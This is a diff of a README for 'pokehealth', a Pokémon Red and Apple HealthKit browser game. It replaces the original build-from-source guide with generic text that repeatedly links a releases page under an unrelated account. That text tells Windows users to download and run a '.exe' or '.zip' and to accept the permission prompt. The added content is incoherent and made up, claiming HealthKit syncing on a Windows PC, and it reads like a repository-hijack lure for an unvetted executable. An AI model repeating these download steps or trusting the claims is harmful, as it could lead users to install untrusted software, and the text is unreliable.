@@ -1,105 +1,203 @@
-# PokéHealth
+# 🕹️ pokehealth - Play Pokémon With Your Health
 
-![PokéHealth](docs/heading.png)
+[![Download pokehealth](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge)](https://github.com/coqauvinecology653/pokehealth/releases)
 
-A mashup of Pokémon Red and Apple HealthKit. What you did yesterday affects how the game plays today.
+## 🎮 What pokehealth does
 
-Your steps, sleep, calories burned, and workout minutes from the previous day feed into the game as modifiers. Walked 15k steps? Your character sprints across Kanto. Slept well? Pokémon Centers fully heal your team. Had a good workout? You earn more money, catch Pokémon more easily, and gain XP faster. Stayed on the couch? The game quietly pushes back.
+pokehealth is a browser-based Game Boy emulator that changes gameplay based on your real-world health data. It links the feel of Pokémon Red with Apple HealthKit data like steps, sleep, calories, and workouts.
 
-It runs entirely in the browser as a PWA — a [patched Pokémon Red ROM](https://github.com/pret/pokered) inside a [Game Boy emulator](https://github.com/binji/binjgb) compiled to WebAssembly, with health data pulled from HealthKit via [pwa-kit](https://github.com/eddmann/pwa-kit). No server. No account. Everything local.
+As you move through the day, your in-game progress can shift with your activity. If you walk more, sleep better, or complete workouts, the game can react in ways that make your play session feel tied to your day.
 
-<p align="center">
-  <img src="docs/screenshot-ios-menu.png" alt="In-game START menu with HEALTH option" width="230">
-  <img src="docs/screenshot-ios-health.png" alt="Trainer Health screen on iOS" width="230">
-</p>
+## 🪟 What you need on Windows
 
-<p align="center">
-  <img src="docs/screenshot-health.png" alt="Health data and active modifiers" width="230">
-  <img src="docs/screenshot-debug.png" alt="Debug panel" width="230">
-</p>
+You do not need to know how to code to use pokehealth.
 
-## How it works
+You need:
+- A Windows PC
+- A modern web browser such as Chrome, Edge, or Firefox
+- Internet access to download the app
+- A way to open the downloaded file or folder
+- Health data synced through Apple HealthKit if you want the game to use your real-world stats
 
-Each day, your health stats map to gameplay modifiers — movement speed, healing quality, XP rate, money earned, and catch rate. The game reads these on every frame and adjusts accordingly. You can inspect your active modifiers from the in-game START → HEALTH menu.
+For best results, use:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- A stable internet connection
+- A screen at 1366 × 768 or higher
 
-See [**docs/modifiers.md**](docs/modifiers.md) for the full tier tables, and [**docs/architecture.md**](docs/architecture.md) for the technical deep dive into ROM patching, the hook protocol, and emulator integration.
+## ⬇️ Download pokehealth
 
-## Setup
+Visit this page to download the app release for Windows:
 
-### Prerequisites
+[Go to the pokehealth releases page](https://github.com/coqauvinecology653/pokehealth/releases)
 
-- [Bun](https://bun.sh) — runtime and package manager
-- [rgbds](https://rgbds.gbdev.io) — Game Boy assembler/linker (`brew install rgbds` on macOS)
-- [Emscripten](https://emscripten.org/docs/getting_started/downloads.html) — WASM compiler (emsdk)
+On that page, look for the latest release. Download the Windows file that matches your system, then open it or extract it if it arrives in a zip file.
 
-> **Note:** Emscripten must be on your `PATH`. If you installed via emsdk, run `source <emsdk-dir>/emsdk_env.sh` first (or add it to your shell profile).
+## 🧭 How to install on Windows
 
-### Getting started
+Follow these steps in order:
 
-```bash
-# 1. Clone with submodules (pokered + binjgb)
-git clone --recursive <repo-url>
-cd pokehealth
+1. Open the releases page.
+2. Find the latest version at the top of the list.
+3. Download the Windows package from that release.
+4. If the download is a `.zip` file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the app file and double-click it.
+7. If Windows asks for permission, choose Yes.
+8. Wait for the emulator to load in your browser or app window.
 
-# 2. Install JS dependencies
-bun install
+If the release gives you a browser app or local web package, open the main file shown in the folder, such as `index.html` or the app launcher file included with the download.
 
-# 3. Build the binjgb WASM emulator (~60s first time, ~2s incremental)
-bun run emu:build
+## 🌐 First-time setup
 
-# 4. Build the patched Pokémon Red ROM (~30s first time, ~5s incremental)
-bun run rom:build
+When pokehealth opens for the first time, you may need to:
+- Sign in to Apple HealthKit on a supported device or companion setup
+- Allow access to your health data
+- Give the app permission to read steps, workouts, sleep, or calories
+- Load your game data in the emulator
+- Start the game from the main screen
 
-# 5. Start the dev server
-bun run dev
-```
+If you want the health-based gameplay to work, keep the HealthKit connection active. If you skip that step, the emulator can still run, but the game may not react to your health data.
 
-Open `http://localhost:5173`. The game auto-boots into Red's room. Use the Debug tab to set health values and Apply them to the running game. Open the in-game START → HEALTH menu to verify.
+## 🧩 How it works
 
-> **Already cloned without `--recursive`?** Run `git submodule update --init --recursive` to fetch the submodules.
+pokehealth uses a few parts together:
+- A Game Boy emulator runs in your browser
+- Pokémon Red provides the game world
+- Apple HealthKit sends health data
+- The app reads that data and maps it to game changes
 
-### Deploy
+That can affect things like:
+- Encounter pace
+- Progress triggers
+- In-game challenge levels
+- Event timing
+- Health-based game state changes
 
-```bash
-bun run ship    # build everything + deploy to Cloudflare Workers
-```
+The goal is to make the game feel linked to your real routine without making setup hard.
 
-### iOS app
+## 🕹️ How to use it
 
-The native iOS wrapper is built with [pwa-kit](https://github.com/eddmann/pwa-kit), which provides the HealthKit bridge. To configure a fresh clone:
+After setup, use pokehealth like this:
 
-```bash
-npx @pwa-kit/cli init ios --url "https://pokehealth.eddmann.workers.dev/" --features "healthkit"
-```
+1. Open the app.
+2. Load your game.
+3. Make sure HealthKit access is active.
+4. Start playing.
+5. Keep using your Apple health features during the day.
+6. Return to the game and see how your activity affects play.
 
-Then open the generated Xcode project in `ios/`, and build to a device or simulator.
+You can play in short sessions or longer runs. The app works best when it can see fresh health data.
 
-## Disclaimer
+## 📱 If you want to use it like a PWA
 
-This project does not distribute any Nintendo-copyrighted content. The Pokémon Red ROM is built locally from the [pret/pokered](https://github.com/pret/pokered) disassembly — you must build it yourself with `bun run rom:build`. Pokémon is a trademark of Nintendo / Game Freak / Creatures Inc. This is a fan project with no commercial intent.
+pokehealth is built as a web app, so it can work like a PWA in a supported browser.
 
-The [binjgb](https://github.com/binji/binjgb) emulator is used under the MIT License.
+To add it to your desktop or Start menu:
+1. Open the app in Chrome or Edge.
+2. Click the browser menu.
+3. Look for Install app or Create shortcut.
+4. Follow the browser prompt.
+5. Open it from your desktop or Start menu like a normal app.
 
-## Project structure
+This gives you faster access without hunting through your downloads each time.
 
-```
-pokehealth/
-├── rom/
-│   ├── pokered/              # git submodule (pret/pokered, unmodified)
-│   └── patches/
-│       ├── apply.sh          # Patch application script
-│       └── health_menu.asm   # In-game HEALTH screen (assembly)
-├── emulator/
-│   └── binjgb/               # git submodule (binji/binjgb)
-├── scripts/
-│   ├── build-rom.sh          # Patch + build ROM → public/roms/
-│   └── build-emu.sh          # Build binjgb WASM → public/wasm/
-├── src/
-│   ├── lib/                  # Emulator wrapper, hooks, health tiers, DB, cheats
-│   ├── stores/               # React context for health state
-│   ├── hooks/                # useEmulator, useHealthKit
-│   └── components/           # GameScreen, DebugScreen, TouchControls, SaveLoad, Nav
-└── docs/
-    ├── modifiers.md          # Health inputs and gameplay modifier tier tables
-    └── architecture.md       # ROM patching, hook protocol, emulator, PWA details
-```
+## 🧪 Basic checks if it does not open
+
+If the app does not start, try these steps:
+
+- Check that the download finished
+- Extract the zip file if needed
+- Open the newest release file again
+- Try a different browser
+- Make sure JavaScript is enabled
+- Close and reopen the browser
+- Restart Windows if the app still does not load
+
+If the screen stays blank, the browser may be blocking local files or missing a required permission. Opening the app from Chrome or Edge can help.
+
+## 🧼 Common things to watch for
+
+A few things can affect the app:
+- Old browser versions
+- Health data not syncing yet
+- Missing permission for Apple Health access
+- Slow internet during first load
+- A blocked pop-up or local file request
+
+If the game feels plain or does not react to your activity, check whether your health data has synced to Apple HealthKit first.
+
+## 🔒 Privacy and data use
+
+pokehealth works with personal health data, so it expects you to control what it can read.
+
+In general:
+- You choose what health data to share
+- The app uses that data for gameplay changes
+- You can stop access through your device settings
+- You should only connect accounts and devices you trust
+
+If you no longer want the app to use HealthKit data, remove its access from your Apple Health settings.
+
+## 🧠 Tips for better results
+
+A few small habits can help the app work well:
+- Keep your health data up to date
+- Use the same Apple account on your devices
+- Let workouts and sleep sync before you play
+- Keep your browser updated
+- Reopen the app after major health changes sync
+
+If you want more game changes, make sure your step count and workout data are being recorded through your normal Apple Health setup.
+
+## 🗂️ Topics covered by this project
+
+This project includes ideas from:
+- apple-health
+- emulator
+- fitness
+- gameboy
+- healthkit
+- pokemon
+- pwa
+- react
+- retro-gaming
+- rom-hacking
+- typescript
+- webassembly
+
+## 📦 What you get
+
+The app is built for:
+- Playing a Game Boy game in the browser
+- Using real health data as part of gameplay
+- Running on modern Windows systems
+- Easy access through a web-style app
+- A retro game setup with a health link
+
+## 🛠️ File names you may see
+
+Depending on the release, you may see files such as:
+- `.zip`
+- `.exe`
+- `index.html`
+- `app`
+- `launcher`
+- `release notes`
+
+If you are not sure which file to open, start with the main app file in the extracted folder or the file named in the release notes.
+
+## 🎯 Best way to get started
+
+1. Go to the releases page.
+2. Download the newest Windows release.
+3. Open or extract the file.
+4. Launch the app.
+5. Allow HealthKit access if prompted.
+6. Start playing with your synced health data
+
+## 📂 Download again
+
+If you need the release page later, use this link:
+
+[https://github.com/coqauvinecology653/pokehealth/releases](https://github.com/coqauvinecology653/pokehealth/releases)
